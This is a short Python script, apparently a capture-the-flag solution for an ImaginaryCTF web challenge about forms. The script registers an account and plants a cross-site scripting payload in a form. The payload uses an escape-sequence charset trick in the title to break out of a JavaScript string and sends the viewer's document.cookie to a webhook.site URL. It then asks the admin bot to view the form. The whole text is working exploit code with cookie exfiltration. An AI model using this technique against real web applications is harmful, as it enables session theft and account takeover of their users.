from json import dumps
import re
import requests
from secrets import token_hex

#BASE_URL = 'http://localhost:5000'
BASE_URL = 'http://forms.chal.imaginaryctf.org/'
user = token_hex(32)
webhook = f'https://webhook.site/0cd70411-3123-4ac0-8252-3162de47dc11' # replace with your own webhook, e.g. from https://app.interactsh.com/#/
payload = f'fetch(`{webhook}?${{document.cookie}}`).then(console.log)'

with requests.Session() as s:
    r = s.post(f'{BASE_URL}/register', data={'username': user, 'password': user})
    assert r.status_code == 200
    r = s.post(f'{BASE_URL}/login', data={'username': user, 'password': user})
    assert r.status_code == 200
    r = s.post(f'{BASE_URL}/form/create', data={'title': 'Totally not a sus title\x1b(J', 'questions': dumps([[f'Are you an impostor?"\x7d];{payload};const foo=[//', True]])})
    assert r.status_code == 200
    pat = re.compile(r'[0-9a-f]{8}-([0-9a-f]{4}-){3}[0-9a-f]{12}')
    m = pat.search(r.text)
    id = m.group(0)
    r = s.post(f'{BASE_URL}/form/ask/{id}')
    assert r.status_code == 200

